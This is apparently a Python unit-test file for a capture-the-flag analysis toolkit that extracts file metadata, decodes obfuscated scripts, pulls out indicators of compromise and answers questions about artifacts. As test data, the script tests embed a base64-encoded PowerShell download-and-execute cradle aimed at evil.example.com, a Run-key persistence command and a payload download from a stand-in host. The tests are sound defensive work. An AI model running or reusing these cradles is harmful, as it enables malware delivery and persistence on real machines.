import base64
import gzip
from io import BytesIO
from pathlib import Path
import struct
import unittest
import zipfile
import zlib

from huntress_ctf.evidence import collect, decoded_blobs, iocs, metadata
from huntress_ctf.solvers import SolveContext
from huntress_ctf.solvers.facts import FactSolver


def ifd(entries, base):
    head = struct.pack("<H", len(entries))
    data = b""
    data_offset = base + 2 + 12 * len(entries) + 4
    for tag, kind, count, raw in entries:
        if len(raw) <= 4:
            head += struct.pack("<HHI", tag, kind, count) + raw.ljust(4, b"\x00")
        else:
            head += struct.pack("<HHII", tag, kind, count, data_offset + len(data))
            data += raw + b"\x00" * (len(raw) % 2)
    return head + struct.pack("<I", 0) + data


def rationals(*values):
    return b"".join(struct.pack("<II", value, 1) for value in values)


def jpeg_with_exif(artist=b"Jane Doe\x00"):
    first = [(0x013B, 2, len(artist), artist), (0x8825, 4, 1, struct.pack("<I", 0))]
    gps_offset = 8 + len(ifd(first, 8))
    first[1] = (0x8825, 4, 1, struct.pack("<I", gps_offset))
    gps = [(1, 2, 2, b"N\x00"), (2, 5, 3, rationals(59, 19, 48)),
           (3, 2, 2, b"E\x00"), (4, 5, 3, rationals(18, 4, 12))]
    tiff = b"II*\x00" + struct.pack("<I", 8) + ifd(first, 8) + ifd(gps, gps_offset)
    segment = b"Exif\x00\x00" + tiff
    return b"\xff\xd8\xff\xe1" + struct.pack(">H", len(segment) + 2) + segment + b"\xff\xd9"


def png_chunk(kind, data):
    return struct.pack(">I", len(data)) + kind + data + struct.pack(">I", zlib.crc32(kind + data))


def office(**props):
    core = "".join(f"<{key}>{value}</{key}>" for key, value in props.items())
    buffer = BytesIO()
    with zipfile.ZipFile(buffer, "w") as archive:
        archive.writestr("[Content_Types].xml", "<Types/>")
        archive.writestr("docProps/core.xml", f"<cp:coreProperties>{core}</cp:coreProperties>")
    return buffer.getvalue()


def context(artifact, question, ids=("a",), **attempt):
    return SolveContext("c", {}, {"answer_ids": list(ids), "question": question, **attempt},
                        artifact, Path("x"), ids)


class MetadataTests(unittest.TestCase):
    def test_jpeg_exif_and_gps(self):
        found = metadata(jpeg_with_exif())
        self.assertEqual(found["EXIF:Artist"], ["Jane Doe"])
        self.assertEqual(found["GPS:Position"], ["59.330000, 18.070000"])

    def test_png_text_chunks(self):
        png = b"\x89PNG\r\n\x1a\n" + png_chunk(b"tEXt", b"Author\x00Jane") + png_chunk(b"IEND", b"")
        self.assertEqual(metadata(png)["PNG:Author"], ["Jane"])

    def test_pdf_info_plain_and_compressed(self):
        compressed = zlib.compress(b"<< /Producer (Hidden Producer) >>")
        pdf = (b"%PDF-1.7\n1 0 obj << /Author (Jane \\(J\\) Doe) /Title <FEFF004100420043> >> endobj\n"
               b"2 0 obj << /Filter /FlateDecode >> stream\n" + compressed + b"\nendstream endobj")
        found = metadata(pdf)
        self.assertEqual(found["PDF:Author"], ["Jane (J) Doe"])
        self.assertEqual(found["PDF:Title"], ["ABC"])
        self.assertEqual(found["PDF:Producer"], ["Hidden Producer"])

    def test_office_core_properties(self):
        found = metadata(office(**{"dc:creator": "Jane", "cp:lastModifiedBy": "Mallory &amp; Co"}))
        self.assertEqual(found["Office:creator"], ["Jane"])
        self.assertEqual(found["Office:lastModifiedBy"], ["Mallory & Co"])


class ScriptTests(unittest.TestCase):
    def test_encoded_command_and_iocs(self):
        payload = "IEX (New-Object System.Net.WebClient).DownloadString('http://evil.example.com/a.ps1')"
        script = "powershell -nop -EncodedCommand " + base64.b64encode(payload.encode("utf-16-le")).decode()
        facts = collect(script.encode())
        self.assertIn(("encoded-command", payload), facts.blobs)
        self.assertEqual(facts.iocs["url"], ["http://evil.example.com/a.ps1"])
        self.assertEqual(facts.iocs["domain"], ["evil.example.com"])

    def test_gzip_from_base64_and_char_codes(self):
        packed = base64.b64encode(gzip.compress(b"$u = 'http://c2.example.net/x'")).decode()
        blobs = dict(decoded_blobs(f"[IO.Compression.GzipStream]::new([Convert]::FromBase64String('{packed}'))"))
        self.assertEqual(blobs["from-base64"], "$u = 'http://c2.example.net/x'")
        self.assertEqual(dict(decoded_blobs("$x = [char]72+[char]105+[char]33+[char]33"))["char-codes"], "Hi!!")

    def test_ioc_kinds(self):
        found = iocs(
            "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\x /d C:\\Users\\Public\\x.exe "
            "beacon 10.1.2.3 mail admin@example.org "
            "sha256 " + "a" * 64
        )
        self.assertEqual(found["registry"], ["HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\x"])
        self.assertEqual(found["ipv4"], ["10.1.2.3"])
        self.assertEqual(found["email"], ["admin@example.org"])
        self.assertEqual(found["sha256"], ["a" * 64])
        self.assertIn("C:\\Users\\Public\\x.exe", found["path"])

    def test_targeted_collect_matches_full_collect(self):
        payload = "IEX (New-Object Net.WebClient).DownloadString('http://evil.example.com/a.ps1') 10.9.8.7"
        script = ("powershell -EncodedCommand " + base64.b64encode(payload.encode("utf-16-le")).decode()
                  + " # admin@example.org").encode()
        full = collect(script)
        for kind in ("url", "domain", "ipv4", "email"):
            with self.subTest(kind=kind):
                targeted = collect(script, ioc_kinds={kind}, want_metadata=False)
                self.assertEqual(targeted.iocs, {kind: full.iocs[kind]})
                self.assertEqual(targeted.metadata, {})
        document = office(**{"dc:creator": "Jane"})
        only_metadata = collect(document, ioc_kinds=set(), want_blobs=False)
        self.assertEqual(only_metadata.metadata, collect(document).metadata)
        self.assertEqual((only_metadata.iocs, only_metadata.blobs), ({}, []))


class FactSolverTests(unittest.TestCase):
    def test_unique_metadata_value_answers(self):
        answers = FactSolver().solve(context(office(**{"dc:creator": "Jane"}), "Who is the author of this document?"))
        self.assertEqual([(a.answer_id, a.answer) for a in answers], [("a", "Jane")])

    def test_conflicting_values_or_categories_give_nothing(self):
        artifact = office(**{"dc:creator": "Jane"}) + b""
        two_authors = jpeg_with_exif(b"Alice\x00") + b"<x:xmpmeta><dc:creator>Bob</dc:creator></x:xmpmeta>"
        self.assertEqual(FactSolver().solve(context(two_authors, "Who is the author?")), [])
        self.assertEqual(FactSolver().solve(context(artifact, "Which domain does the URL use?")), [])
        self.assertEqual(FactSolver().solve(context(artifact, "Describe the file.")), [])

    def test_questions_map_to_their_own_answer_ids(self):
        script = (b"Invoke-WebRequest http://drop.example.com/p.bin -OutFile x\n"
                  b"# " + b"a" * 64 + b"\n# " + b"b" * 64)
        ctx = context(script, "", ids=("q1", "q2"), questions=[
            {"answer_id": "q1", "question": "What URL does the script contact?"},
            {"answer_id": "q2", "question": "What is the SHA256 of the payload?"},
        ])
        answers = FactSolver().solve(ctx)
        self.assertEqual([(a.answer_id, a.answer) for a in answers], [("q1", "http://drop.example.com/p.bin")])


if __name__ == "__main__":
    unittest.main()
